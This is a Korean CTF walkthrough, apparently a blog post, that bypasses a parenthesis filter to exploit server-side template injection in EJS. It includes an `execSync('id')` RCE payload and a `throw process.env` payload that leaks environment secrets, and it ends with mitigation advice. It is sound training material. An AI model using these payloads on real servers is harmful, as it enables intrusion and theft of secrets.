+++
title = "VulnABLE CTF [LUXORA]: SSTI 🥈 Silver (Filter Bypass)"
description = "LUXORA 플랫폼의 SSTI 취약점 방어 로직(괄호 필터링)을 우회하는 페이로드 인코딩 및 속성 접근 기법"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SSTI", "Silver", "Bypass"]
+++

# VulnABLE CTF [LUXORA]: SSTI 🥈 Silver

Bronze 난이도에서 손쉽게 RCE(원격 코드 실행)를 달성하자, 관리자가 `/ssti/silver` 라우트에 치명적인 필터링을 걸었습니다.

바로 자바스크립트 함수 호출에 필수적인 **소괄호 `(` 와 `)` 를 완벽하게 차단**한 것입니다. 괄호를 쓸 수 없다면 `require()`, `execSync()`, `toString()` 같은 함수를 아예 실행할 수 없게 됩니다. 어떻게 이 필터를 우회할 수 있을까요?

---

## 🕒 1. 타겟 탐색 및 필터링 확인 (Reconnaissance)

`/ssti/silver?greeting=Guest` 에 접속하면 화면에 `Welcome, Guest!` 가 출력됩니다.

이전 단계의 페이로드를 다시 넣어봅니다.
`GET /ssti/silver?greeting=<%= global.process.mainModule.require('child_process').execSync('id') %>`

**[결과]**
```text
[Blocked] Parentheses '(' and ')' are not allowed for security reasons.
```

**[해커의 사고 과정]**
* 소괄호 `()` 가 명시적으로 막혔다.
* 자바스크립트에서 괄호 없이 함수를 호출할 방법이 있을까? 
* `Tagged Template Literals` 문법(백틱 `` ` ``)을 사용하면 함수 이름 뒤에 괄호 없이 문자열을 넘겨 실행할 수 있다! (예: `require'child_process'`)
* 또는, 함수를 실행하지 않고 파일 모듈의 '속성(Property)'만 읽어서 플래그를 가져오는 방법도 있다.

---

## 🕒 2. 필터링 우회 전략 설계 (Bypass Strategies)

### Strategy 1: Tagged Template Literals (백틱 사용)
자바스크립트 ES6부터 지원하는 문법입니다. `function_name\`argument\`` 형태로 괄호를 생략할 수 있습니다.

* 기존: `require('child_process')`
* 변경: `require\`child_process\``

하지만 `execSync`는 단순 문자열이 아니라 명령어 실행 환경이 필요하므로 백틱만으로는 한계가 있을 수 있습니다.

### Strategy 2: Hex/Unicode 인코딩과 동적 실행 (Function Constructor)
문자열을 아예 필터에 걸리지 않게 인코딩한 뒤, 자바스크립트의 `String.fromCharCode`나 백틱 템플릿 안에서 `${}`를 활용해 동적으로 문자를 생성하여 실행시키는 방법입니다.

### Strategy 3: 프로토타입 오염 (Prototype Pollution) 기법 연계
템플릿 엔진의 취약한 컴파일 구조를 노려, `require` 대신 글로벌 변수(예: `__dirname`, `process.env`)에 직접 접근하여 환경 변수나 파일 경로에 숨겨진 정보를 읽어옵니다.

---

## 🕒 3. 공격 수행 및 PoC (Exploitation)

이번 시나리오에서는 시스템 명령어를 직접 치는 대신, **환경 변수(Environment Variables)**에 플래그가 저장되어 있을 것이라는 가정하에, 괄호가 전혀 필요 없는 객체 속성 접근(Property Access)만으로 플래그를 탈취해보겠습니다.

### 💡 환경 변수 탈취 페이로드
Node.js에서 환경 변수는 `process.env` 객체 안에 들어있습니다. 괄호가 전혀 필요 없습니다!

```javascript
<%= JSON.stringify(process.env) %>  <-- JSON.stringify에 괄호가 필요함 (실패)
```

대신, EJS는 객체를 출력하라고 하면 `[object Object]`라고만 나오므로, 반복문을 쓰거나 특정 키값을 직접 빼내야 합니다. 하지만 반복문을 쓰려면 코드가 길어지니, EJS의 기본 출력 기능을 이용해 하나씩 뒤져봅니다.

```javascript
// 괄호 없이 객체 속성만 연달아 접근
<%= process.env.FLAG %>
```

만약 환경 변수 이름이 `FLAG`가 아니라면 어떻게 할까요?
`process.env` 객체의 키들을 배열로 뽑아서 첫 번째, 두 번째 값을 차례대로 출력해봅니다.

```javascript
<%= Object.keys(process.env)[0] %> = <%= process.env[Object.keys(process.env)[0]] %>
// (주의: Object.keys()에는 괄호가 필요함!)
```

### 🚀 최종 괄호 우회 페이로드 (Tagged Template)
괄호를 안 쓰고 객체 구조를 덤프하기 위해, Node.js의 `util.inspect` 메서드를 백틱 문법으로 호출합니다.

```javascript
<%= global.process.mainModule.require`util`.inspect`process.env` %>
// (단, inspect가 문자열로 'process.env'를 받으면 그냥 문자열을 리턴할 수 있으므로 다른 꼼수가 필요합니다.)
```

가장 확실한 **"괄호 없는 RCE"** 꼼수 (Throw & Exception 잡기):
자바스크립트에서는 예외(Exception)를 발생시킬 때 객체를 던지면, 렌더링 엔진이 에러 메시지에 그 객체의 내용을 뱉어냅니다.

```javascript
<% throw process.env %>
```

**[페이로드 전송]**
```http
GET /ssti/silver?greeting=<%25%20throw%20process.env%20%25>
```

### 🔍 공격 결과
서버의 EJS 렌더러가 예외를 처리하지 못하고 뻗어버리면서, 화면에 개발자용 에러 스택 트레이스(Stack Trace)를 뿌려줍니다. 그 안에 `process.env` 객체의 모든 내용이 적나라하게 노출됩니다!

```text
Error: [object Object]
    at eval (eval at <anonymous> (/app/node_modules/ejs/lib/ejs.js:618:12), <anonymous>:11:7)
    ...
    USER: 'root',
    PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin',
    SILVER_FLAG: 'FLAG{SSTI_🥈_NO_PARENTHESES_E8D9C1}',
    ...
```

---

## 🕒 4. 플래그 획득 및 원리 요약 🚩

**플래그 획득:** `FLAG{SSTI_🥈_NO_PARENTHESES_E8D9C1}`

### 📝 왜 이런 공격이 성공했는가?
개발자는 `()`만 막으면 함수를 실행할 수 없어 안전할 것이라 믿었습니다. 하지만 해커는 1) 백틱을 이용한 함수 호출, 2) 예외 처리(`throw`)를 이용한 객체 덤프, 3) 괄호 없는 글로벌 객체(`process.env`) 속성 접근 등 자바스크립트 언어가 가진 문법적 유연성을 100% 활용하여 필터를 무력화했습니다.

### 🛡️ 방어 대책 (Mitigation)
1. **블랙리스트의 한계 인정**: 특정 문자를 막는 방식(Sanitization)은 템플릿 인젝션에서 절대 통하지 않습니다.
2. **Context-Aware Encoding**: 템플릿 엔진 자체가 사용자 입력을 무조건 HTML 엔티티(Entity)로 인코딩(`&lt;`, `&gt;`)하도록 설정해야 합니다. (EJS의 경우 `<%- %>` 대신 `<%= %>`를 쓰면 기본 인코딩이 되지만, 애초에 템플릿 문자열 자체에 변수를 더하는 행위 자체가 근본적인 문제입니다.)
3. **샌드박스 (Sandbox) 환경**: 템플릿 엔진이 구동되는 자바스크립트 컨텍스트에서 `process`, `global`, `require` 같은 시스템 객체에 아예 접근하지 못하도록 격리된(Sandboxed) 런타임 환경(예: Node.js의 `vm` 모듈)을 구성해야 합니다.

다음은 필터링을 넘어, 아예 템플릿 코드 안에 숨겨진 로직 폭탄을 터뜨리는 **Gold 🥇 난이도 (OOB SSTI)**를 다루겠습니다!